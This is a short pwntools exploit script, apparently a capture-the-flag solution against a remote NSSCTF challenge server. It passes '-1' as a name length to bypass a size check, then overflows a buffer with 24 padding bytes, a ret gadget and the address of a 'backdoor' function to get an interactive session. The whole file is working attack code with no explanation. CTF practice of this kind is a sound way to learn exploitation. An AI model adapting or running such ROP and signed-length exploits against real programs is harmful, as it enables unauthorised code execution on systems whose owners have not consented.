from pwn import *

context(os="linux", arch="amd64", log_level="debug")

p = remote("node4.anna.nssnode.cn", 26984)

elf = ELF("temp/pwn")
rop = ROP(elf)
# main_addr = int(p.recvline().strip(), 16)
# base_addr = main_addr - elf.symbols["main"]
backdoor = elf.symbols["backdoor"]
ret = rop.find_gadget(['ret']).address
payload = b'a'*24 + p64(ret) + p64(backdoor)

p2 = '-1'
p.sendlineafter(b'length of your name:', b'-1')
p.sendlineafter(b'name', payload)
#p.sendline(payload)

p.interactive()
